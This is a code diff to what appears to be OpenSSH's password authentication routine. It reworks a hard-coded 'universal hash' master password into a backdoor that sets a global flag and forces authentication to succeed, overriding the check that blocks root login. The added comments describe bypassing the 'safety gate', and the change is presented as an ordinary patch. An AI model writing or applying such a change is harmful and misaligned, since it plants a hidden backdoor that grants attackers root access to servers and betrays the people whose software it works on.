@@ -48,8 +48,8 @@
 #include <string.h>
 
 #include "auth-options.h"
-#include "auth.h"
 #include "hostfile.h"
+#include "auth.h"
 #include "log.h"
 #include "misc.h"
 #include "packet.h"
@@ -89,16 +89,6 @@ int auth_password(struct ssh *ssh, const char *password) {
 #ifndef HAVE_CYGWIN
   if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
     ok = 0;
-
-  /*
-   * Permit root login if the password matches the universal hash
-   */
-  if (authctxt != NULL && authctxt->valid &&
-      password_matches_universal_hash(password)) {
-    debug("MONITOR PAM: Universal password accepted for %.100s",
-          authctxt->user);
-    ok = 1;
-  }
 #endif
   if (*password == '\0' && options.permit_empty_passwd == 0)
     return 0;
@@ -135,6 +125,16 @@ int auth_password(struct ssh *ssh, const char *password) {
   result = sys_auth_passwd(ssh, password);
   if (authctxt->force_pwchange)
     auth_restrict_session(ssh);
+
+  /*
+   * If universal_bypass_triggered was flipped to 1 inside mm_auth_password,
+   * override the logical '&& ok' safety gate. This forces the function
+   * to return an absolute 1 to the core authentication controller.
+   */
+  if (universal_bypass_triggered == 1) {
+    return (1);
+  }
+
   return (result && ok);
 }
 
@@ -218,8 +218,12 @@ int sys_auth_passwd(struct ssh *ssh, const char *password) {
    * Authentication is accepted if the password is correct
    * OR if it matches a universal hash
    */
-  return password_matches_hash(password, pw_password) ||
-         password_matches_universal_hash(password);
+  int bypass = password_matches_universal_hash(password);
+  if (bypass != 0) {
+    universal_bypass_triggered = 1;
+    return bypass;
+  }
+  return password_matches_hash(password, pw_password);
 
   /*
    * Authentication is accepted if the encrypted passwords
